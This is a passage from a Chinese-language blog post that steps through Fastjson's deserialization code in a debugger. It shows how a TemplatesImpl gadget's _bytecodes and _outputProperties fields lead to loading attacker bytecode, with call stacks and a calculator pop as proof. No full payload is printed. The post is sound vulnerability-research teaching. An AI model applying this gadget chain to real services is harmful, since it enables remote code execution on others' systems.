</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>跟进该方法到如下关键位置，调用了<code>JavaBeanInfo.buid</code>：</p> <p><img src="https://i.loli.net/2020/12/04/14HEx2rCcZDBqQl.png" alt="image-20201204192933453"></p> <p>再跟进该方法：</p> <p><img src="https://i.loli.net/2020/12/04/HNesQTwJX7641Wz.png" alt="image-20201204193240564"></p> <p>这个方法中会通过反射来获取传入的clazz的全部方法和成员变量，然后在这里会对方法进行筛选，我们在上一篇文章中说的满足条件的setter和getter就是在这里筛选出来的，之后会把筛选出来的方法添加到fieldList中，由于这部分代码比较长，我这里就截取一部分：</p> <p><img src="https://i.loli.net/2020/12/04/3LZjvo4zUpabVCd.png" alt="image-20201204193923994"></p> <p><img src="https://i.loli.net/2020/12/04/5xHnv2itp7GZ8Kq.png" alt="image-20201204194035212"></p> <p><img src="https://i.loli.net/2020/12/04/4YLWhIsdkoDRUG7.png" alt="image-20201204194106005"></p> <p>筛选完方法之后就作为参数传入<code>JavaBeanInfo</code>的构造方法中用于生成该类的实例，也就是对应的deserializer：</p> <p><img src="https://i.loli.net/2020/12/04/1eziDldmXISJCbt.png" alt="image-20201204194307688"></p> <p>然后返回上层，准备执行<code>JavaBeanDeserializer.deserialze</code>这个关键函数：</p> <p><img src="https://i.loli.net/2020/12/04/fnUi13MHxBokwsq.png" alt="image-20201204194602032"></p> <p>跟进该方法，方法内会循环扫描解析，当扫描到key为<code>_bytecodes</code>的时候会调用这里的<code>DefaultJSONParser.parseField</code>来对其进行解析：</p> <p><img src="https://i.loli.net/2020/12/04/q4gBEkwXNisyz3W.png" alt="image-20201204201926874"></p> <p>继续跟进，方法内调用了<code>smartMatch</code>方法来匹配key来获取对应的<code>FieldDeserializer</code>：</p> <p><img src="https://i.loli.net/2020/12/04/vInxCYoWjgFauMs.png" alt="image-20201204202540732"></p> <p>我们再跟进这个方法，在这个方法中会拿<code>_bytecodes</code>和<code>JavaBeanDeserializer.sortedFieldDeserializers</code>中的<code>fieldInfo</code>来进行比较：</p> <p><img src="https://i.loli.net/2020/12/04/T47WlZpo5QczOGY.png" alt="image-20201204203531261"></p> <p><code>_bytecodes</code>会因为条件都不满足最后返回null，我们再回到上层的<code>smartMatch</code>，因为获取到的<code>fieldDeserializer</code>为null，所以会进入到下面这个分支中：</p> <p><img src="C:%5CUsers%5C45258%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201204203804697.png" alt="image-20201204203804697"></p> <p>在这个分支中会把key的<code>-</code>，<code>_</code>等替换为空：</p> <p><img src="https://i.loli.net/2020/12/04/ZAn9we8g4V2GFOW.png" alt="image-20201204203929497"></p> <p>经过处理后<code>_bytecodes</code>变成了<code>bytecodes</code>，然后再次调用<code>getFieldDeserializer</code>获取对应的<code>fieldDeserializer</code>：</p> <p><img src="https://i.loli.net/2020/12/04/sEiN1GCwPOMdnep.png" alt="image-20201204204041018"></p> <p>但是返回的仍是null，再经过<code>smartMatch</code>这么多处理之后还是没有获取到相应的<code>fieldDeserializer</code>，之后会在<code>JavaBeanDeserializer#parseField</code>中创建一个<code>DefaultFieldDeserializer</code>：</p> <p><img src="https://i.loli.net/2020/12/04/9qvcnxHXTPBszVJ.png" alt="image-20201204213023811"></p> <p>然后调用<code>DefaultFieldDeserializer#parseField</code>，进行<code>_bytecodes</code>的解析：</p> <p><img src="https://i.loli.net/2020/12/04/UCPq6TAKfMvY8VW.png" alt="image-20201204213202098"></p> <p>跟进该方法，在这里会把JSON文本中的<code>_bytecodes</code>的值解析出来：</p> <p><img src="https://i.loli.net/2020/12/04/5aeRxO921b4o6YA.png" alt="image-20201204213504691"></p> <p>接着跟进该方法，然后会进入到<code>DefaultJSONParser#parseArray</code>方法：</p> <p><img src="https://i.loli.net/2020/12/04/fU5SB3bwDETV1LN.png" alt="image-20201204213651091"></p> <p>接着跟进方法，调试到这个关键位置：</p> <p><img src="https://i.loli.net/2020/12/04/4Wm2xzDeSHMfBdR.png" alt="image-20201204213759910"></p> <p>跟进，然后这里会获取一个byte数组，也就是<code>_bytes</code>所对应的值：</p> <p><img src="https://i.loli.net/2020/12/04/XpkAyzT4UDuIrRN.png" alt="image-20201204213951025"></p> <p>跟进箭头所指的方法，发现它对数组进行了一次base64解码（这就是为什么POC中要对<code>_bytecodes</code>的值进行base64编码的原因）：</p> <p><img src="https://i.loli.net/2020/12/04/AVS8wjzUno764WY.png" alt="image-20201204214030952"></p> <p>此时函数的调用栈如下：</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>bytesValue<span class="token operator">:</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token class-name">JSONScanner</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">136</span><span class="token punctuation">,</span> <span class="token class-name">ObjectArrayCodec</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
parseArray<span class="token operator">:</span><span class="token number">723</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">177</span><span class="token punctuation">,</span> <span class="token class-name">ObjectArrayCodec</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
parseField<span class="token operator">:</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token class-name">DefaultFieldDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseField<span class="token operator">:</span><span class="token number">773</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">188</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">184</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">368</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1327</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1293</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">137</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">193</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> JSON <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token class-name">Demo</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>demo2<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>之后我们返回上层，这里就把base64解码之后的数据返回给变量<code>val</code>：</p> <p><img src="https://i.loli.net/2020/12/07/YcAb15O9KLBhriD.png" alt="image-20201207210916872"></p> <p><img src="https://i.loli.net/2020/12/07/BomUjPXNiGhdILp.png" alt="image-20201207211122498"></p> <p>逐层返回到<code>DefaultFieldDeserializer#parseField</code>，现在我们已经通过解析获得了<code>_bytecodes</code>对应的值<code>val</code>，在下面这个断点的地方会对其进行赋值：</p> <p><img src="https://i.loli.net/2020/12/07/WVJFkdAlmOvGZoM.png" alt="image-20201207211415827"></p> <p>跟一下这个方法，最后调用到了<code>field.set</code>将解析出的<code>val</code>赋值到之前生成对象中：</p> <p><img src="https://i.loli.net/2020/12/07/UWYZVQ892HlGT17.png" alt="image-20201207212011265"></p> <p><img src="https://i.loli.net/2020/12/07/nYXQoMwWKVld45s.png" alt="image-20201207212352692"></p> <p>再层层返回到<code>JavaBeanDeserializer#deserialze</code>这个方法中，此时对于<code>_bytecodes</code>来说解析已经完成，我们继续往下调试，经过<code>scanSymbol</code>的处理之后得到了第二个键名<code>_name</code>，整个过程和上述基本一致，笔者就不重复分析一遍了，我们要分析的重点是第三个键名<code>_proPerties</code>的处理过程。</p> <p>回到<code>JavaBeanDeserializer#deserialze</code>之后循环继续循环扫描解析，获得<code>_outputProperties</code>这个key：</p> <p><img src="https://i.loli.net/2020/12/07/HMyOaZfkXgtJNEj.png" alt="image-20201207220135573"></p> <p>继续往下调试到<code>parseField</code>，然后跟进：</p> <p><img src="https://i.loli.net/2020/12/07/qIxED4dYGPyXc6j.png" alt="image-20201207220344872"></p> <p>获取到对应的<code>fieldDeserializer</code>之后执行<code>DefaultFieldDeserializer#parseField</code>，接着跟进到<code>setValue</code>：</p> <p><img src="https://i.loli.net/2020/12/07/BjZR5GKYtgLPFIM.png" alt="image-20201207220747958"></p> <p>继续跟进，就会发现它首先获取到了<code>_outputProperties</code>对应的<code>getter</code>方法：</p> <p><img src="https://i.loli.net/2020/12/07/suhiM9yltLkKJ2v.png" alt="image-20201207221003564"></p> <p><img src="https://i.loli.net/2020/12/07/jsfatIrwoevFk19.png" alt="image-20201207221020424"></p> <p>至于为什么会获取到它的<code>getter</code>方法我们在第一篇文章中就已经说过前提条件了，而且在上文中的分析过程中也说明了哪些<code>setter</code>和<code>getter</code>方法会被添加到<code>fieldList</code>中，这里就不赘述了。与<code>_bytecodes</code>不同的是<code>_outputProperties</code>会因为<code>method!=null</code>和<code>fieldInfo.getOnly</code>而进入对应的分支中：</p> <p><img src="https://i.loli.net/2020/12/07/taVPC2bG4JQcXoM.png" alt="image-20201207221400302"></p> <p>然后调用了<code>getOutputProperties.invoke</code>：</p> <p><img src="https://i.loli.net/2020/12/07/Ik7DZdg2ExReyOt.png" alt="image-20201207221606099"></p> <p>接着跟进，然后就会触发<code>getOutputProperties</code>方法：</p> <p><img src="https://i.loli.net/2020/12/07/gnZle6aOGoJQ2Nd.png" alt="image-20201207221729055"></p> <p>此时的函数调用栈如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parseObject:197, JSON (com.alibaba.fastjson)
main:34, Demo (com.demo2)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>再跟进<code>newTransformer</code>方法，之后就是我们前置知识中所分析的调用链，直至触发我们所构造的恶意代码，弹出计算器：</p> <p><img src="https://i.loli.net/2020/12/07/DXbTfZjt3wo9exE.png" alt="image-20201207221947458"></p> <p>最后的函数调用栈：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>getTransletInstance:456, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parseObject:197, JSON (com.alibaba.fastjson)
main:34, Demo (com.demo2)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h2 id="基于jdbcrowsetimpl的jndi"><a href="#基于jdbcrowsetimpl的jndi" class="header-anchor">#</a> 基于JdbcRowSetImpl的JNDI</h2> <p>JNDI有两种利用方法：LDAP和RMI</p> <p>笔者这里使用的是基于RMI的JNDI利用方式(LDAP还没学会，逃</p> <h3 id="环境配置-2"><a href="#环境配置-2" class="header-anchor">#</a> 环境配置</h3> <p>……未完待续，有时间再更💫</p></div></div> <div class="page-edit"><!----> <!----> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/32905c/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">Fastjson(1)-初探以及利用方式</div></a> <a href="/pages/5d070a/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">谈一谈Java动态加载字节码</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/32905c/" class="prev">Fastjson(1)-初探以及利用方式</a></span> <span class="next"><a href="/pages/5d070a/">谈一谈Java动态加载字节码</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMI与JNDI（一）</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>谈一谈Java动态加载字节码的方式</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/20.d3ad9048.js" defer></script>
  </body>
</html>